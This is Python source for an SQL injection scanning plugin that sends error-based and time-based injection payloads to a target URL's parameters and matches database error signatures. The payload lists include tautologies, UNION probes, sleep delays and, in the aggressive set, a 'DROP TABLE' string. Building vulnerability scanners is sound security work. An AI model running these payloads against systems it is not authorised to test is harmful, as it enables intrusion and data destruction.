"""SQLi Detector — W4 Vuln Scanning.

Error-based and time-based boolean-blind SQL injection detection against a
web app. The URL may contain a {fuzz} placeholder; otherwise every
query parameter is tested. Payload sets are bounded.
"""

from __future__ import annotations

import re
import socket
import time
from datetime import datetime, timezone
from urllib.parse import parse_qsl, quote, urlencode, urlparse, urlunparse
from urllib.request import Request, urlopen
from urllib.error import HTTPError, URLError

from ...core.tool import FieldSpec, ToolContext, ToolMeta

TOOL = ToolMeta(
    name="sqli-detector",
    title="SQLi Detector (error + time based)",
    wave=4,
    description=(
        "Detect SQL injection in a URL — error-signature and time-based "
        "boolean blind. Use a {fuzz} placeholder or let "
        "it test each query parameter."
    ),
    category="vulnscan",
    mode="act",
    privileges="none",
    target_fields=["target_url"],
    fields=[
        FieldSpec(name="target_url", label="Target URL", type="text", required=True,
                  placeholder="http://127.0.0.1:8080/item?id={fuzz}"),
        FieldSpec(name="payload_set", label="Payload set", type="combo",
                  options=["stock", "aggressive"], default="stock"),
        FieldSpec(name="error_based", label="Error-based checks", type="bool",
                  default=True),
        FieldSpec(name="time_based", label="Time-based checks", type="bool",
                  default=True),
        FieldSpec(name="timeout", label="Request timeout (s)", type="int", default=5),
        FieldSpec(name="delay_s", label="Delay threshold (s)", type="int", default=3),
    ],
)

_ERROR_SIGNATURES = [
    ("mysql", r"SQL syntax|You have an error in your SQL syntax|"
              r"Warning: mysql_|mysqli_|near \" at line|mariadb"),
    ("postgres", r"ERROR:\s+\w+.*syntax|invalid input syntax|"
                 r"relation .* does not exist"),
    ("sqlite", r"SQLITE_ERROR|no such column|unable to open database|"
               r"syntax error"),
    ("mssql", r"Unclosed quotation mark|Incorrect syntax near|"
              r"Line \d+: Incorrect syntax"),
    ("oracle", r"ORA-\d{5}"),
    ("generic", r"SQL.?State|SQLException|java\.sql\.|Unterminated string"),
]

_ERROR_PAYLOADS = [
    "'", "\"", "1'", "1\"", "1'--", "1'#", "1';--", "' OR '1'='1", "1 OR 1=1 --",
    "1 UNION SELECT NULL,NULL,NULL--", "1' AND '1'='1'--", "1' AND '1'='2'--",
]

_TIME_PAYLOADS = [
    "1' AND SLEEP({d})--", "1 AND SLEEP({d})", "1'; SELECT pg_sleep({d});--",
    "1' OR pg_sleep({d})--", "1 AND 1=1",
    "1'; WAITFOR DELAY '0:0:{d}';--",
]

_BASE_TIMEOUT = 10


def _check_target_url(url: str, ctx: ToolContext) -> None:
    parsed = urlparse(url)
    if parsed.scheme not in ("http", "https"):
        raise ValueError("target_url must be http(s)://...")


def _fetch(url: str, timeout: float, user_agent: str) -> tuple:
    req = Request(url, headers={"User-Agent": user_agent})
    body = b""
    status = 0
    try:
        with urlopen(req, timeout=timeout) as resp:
            body = resp.read(2048)
            status = resp.status
    except HTTPError as exc:
        try:
            body = exc.read(2048)
        except OSError:
            body = b""
        status = exc.code
    except (URLError, OSError) as exc:
        raise OSError(str(getattr(exc, "reason", exc))) from exc
    return status, body.decode("utf-8", "replace")


def _probe_url(candidate: str, payload: str) -> str:
    return candidate.replace("{fuzz}", quote(payload, safe=""))


def _scan_candidates(url: str):
    """Yield (label, concrete_url) either from {fuzz} slot or per-query-param."""
    parsed = urlparse(url)
    if "{fuzz}" in url:
        yield "url-slot", url
    elif parsed.query:
        pairs = parse_qsl(parsed.query)
        for key, _ in pairs:
            others = [(k, v) for (k, v) in pairs if k != key]
            if others:
                rebased = urlencode(others) + "&" + key + "={fuzz}"
            else:
                rebased = key + "={fuzz}"
            rebuilt = urlunparse((parsed.scheme, parsed.netloc, parsed.path,
                                  parsed.params, rebased, parsed.fragment))
            yield key, rebuilt
    else:
        yield "url", url


def _match_errors(status_body: str) -> list:
    found = []
    lowered = status_body.lower()
    for db, pattern in _ERROR_SIGNATURES:
        if re.search(pattern, lowered, re.IGNORECASE):
            found.append(db)
    return found


def run(params: dict, ctx: ToolContext) -> dict:
    url = str(params.get("target_url") or "").strip()
    if not url:
        raise ValueError("target_url is required")
    _check_target_url(url, ctx)
    payload_set = str(params.get("payload_set") or "stock")
    if payload_set not in ("stock", "aggressive"):
        raise ValueError("payload_set must be stock or aggressive")
    error_based = bool(params.get("error_based", True))
    time_based = bool(params.get("time_based", True))
    try:
        timeout = float(params.get("timeout") or 5)
        delay_s = int(params.get("delay_s") or 3)
    except (TypeError, ValueError):
        raise ValueError("timeout/delay_s must be numbers")
    if delay_s < 1:
        raise ValueError("delay_s must be >= 1")
    ua = ctx.config.get("user_agent", "SecurityToolkitSuite/0.1.0")
    stop = ctx.extra.get("stop_event")

    error_payloads = list(_ERROR_PAYLOADS)
    time_payloads = list(_TIME_PAYLOADS)
    if payload_set == "aggressive":
        error_payloads += ["' OR '1'='1' /*", "') OR ('1'='1", "1\" OR \"1\"=\"1",
                           "1'; DROP TABLE fuzz--", "1 UNION SELECT version(), 2--"]
        time_payloads += ["1 AND SLEEP({d}) AND 1=1", "1'||pg_sleep({d})--"]

    findings: list = []
    tested = 0
    requests = 0
    start = datetime.now(timezone.utc)
    for label, candidate in _scan_candidates(url):
        if stop is not None and stop.is_set():
            break
        # baseline for each candidate
        baseline_url = candidate.replace("{fuzz}", "1")
        try:
            base_status, base_body = _fetch(baseline_url, _BASE_TIMEOUT, ua)
            requests += 1
        except OSError:
            continue
        base_len = len(base_body)
        if error_based:
            for payload in error_payloads:
                if stop is not None and stop.is_set():
                    break
                probe = _probe_url(candidate, "" if payload == "'" else payload)
                try:
                    st, body = _fetch(probe, timeout, ua)
                    requests += 1
                except OSError:
                    continue
                tested += 1
                dbs = _match_errors(body)
                if dbs and body[:100].lower() != base_body[:100].lower():
                    findings.append({
                        "target": url, "parameter": label, "kind": "error-based",
                        "payload": payload, "db_engine": dbs,
                        "status": st, "evidence": body[:160].strip(),
                    })
        if time_based:
            for payload in time_payloads:
                if stop is not None and stop.is_set():
                    break
                if "{d}" in payload:
                    probe_payload = payload.format(d=delay_s)
                else:
                    probe_payload = payload
                probe = _probe_url(candidate, probe_payload)
                began = time.monotonic()
                try:
                    _fetch(probe, timeout + delay_s + 2, ua)
                    requests += 1
                except OSError:
                    continue
                elapsed = time.monotonic() - began
                tested += 1
                if elapsed > delay_s:
                    findings.append({
                        "target": url, "parameter": label, "kind": "time-based",
                        "payload": probe_payload, "db_engine": ["(timing)"],
                        "status": "latency", "evidence":
                            f"response took {elapsed:.1f}s (> {delay_s}s)",
                    })

    return {
        "target_url": url,
        "candidates_tested": tested,
        "requests": requests,
        "findings": findings,
        "finished_at": start.isoformat(),
    }


def render(result: dict) -> str:
    lines = [
        f"SQLi scan {result['target_url']}: {result['candidates_tested']} probes, "
        f"{len(result['findings'])} findings",
    ]
    for f in result.get("findings", []):
        lines.append(
            f"  * [{f['kind']}] param={f['parameter']} db={','.join(f['db_engine'])} "
            f"payload={f['payload']!r}\n      {f['evidence'][:120]}")
    return "\n".join(lines)